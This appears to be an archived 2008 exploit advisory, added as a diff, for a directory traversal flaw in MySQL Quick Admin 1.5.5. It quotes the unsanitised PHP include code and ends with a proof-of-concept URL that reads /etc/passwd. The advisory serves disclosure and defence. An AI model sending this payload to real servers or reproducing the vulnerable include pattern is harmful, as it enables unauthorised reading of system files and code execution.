@@ -1,0 +1,64 @@
+##################################################################################
+#										 #		
+#		Author:	Vinod Sharma						 #
+#		Email:	vinodsharma.mimit@gmail.com				 #
+#		Date:	05th Nov, 2008						 #
+#		Note: 	This information is only for educational purpose, author # 
+#			will not bear responsibility for any damages. 		 #
+##################################################################################
+
+
+#########################################################################################
+#Directory traversal vulnerability in MySQL Quick Admin 1.5.5 				#
+#allows remote attackers to read and execute arbitrary files via a .. (dot dot) 	#
+#in the lang parameter to actions.php.							#
+#											#
+#											#
+#											#
+#Appplication still unpatched								#
+#											#
+#vulnerable code in actions.php								#
+# 											#				
+#/* code start										#
+#    case 27:										#
+#         $do = $_GET['do'];								#
+#         if($do == "theme" && file_exists("themes/".$_GET['theme'])){			#
+#             setcookie('theme', $_GET['theme'], time()+60*60*24*30);			#
+#             $_SESSION['theme'] = $_GET['theme'];					#
+#             unset($_SESSION['theme_name']);						#
+#         } else if($do == "lang" && file_exists("lang/".$_GET['lang'])){		#
+#             setcookie('language', $_GET['lang'], time()+60*60*24*30);			#
+#             $_SESSION['language'] = $_GET['lang'];					#
+#             unset($_SESSION['lang_name']);						#
+#         }										#
+#         header("Location: main.php");							#
+#											#
+#/* code end										#
+#											#	
+#$_SESSION['language'] is set to the value of the lang parameter without any 		#
+#sanitization.										#
+#											#
+#The actions.php will send this $_SESSION['language'] value to required.php which will 	#
+#pass it to include() function without any sanitization. 				#
+#											#
+#											#
+#vulnerable code in required.php							#
+#											#
+#/* code start 										#
+#											#
+#line 22 in required.php:  include("lang/".$_SESSION['language']."/lang.php");		#			
+#											#
+#/* code end										#
+#########################################################################################
+
+
+POC:http://www.example.com/quickadmin/actions.php?act=27&do=lang&lang=../../../../../../../../../../etc/passwd%00
+
+
+#########################################################################################
+#	references:									#
+#	http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4454			#
+#	http://secunia.com/advisories/31820						#
+#########################################################################################
+
+# milw0rm.com [2008-11-06]
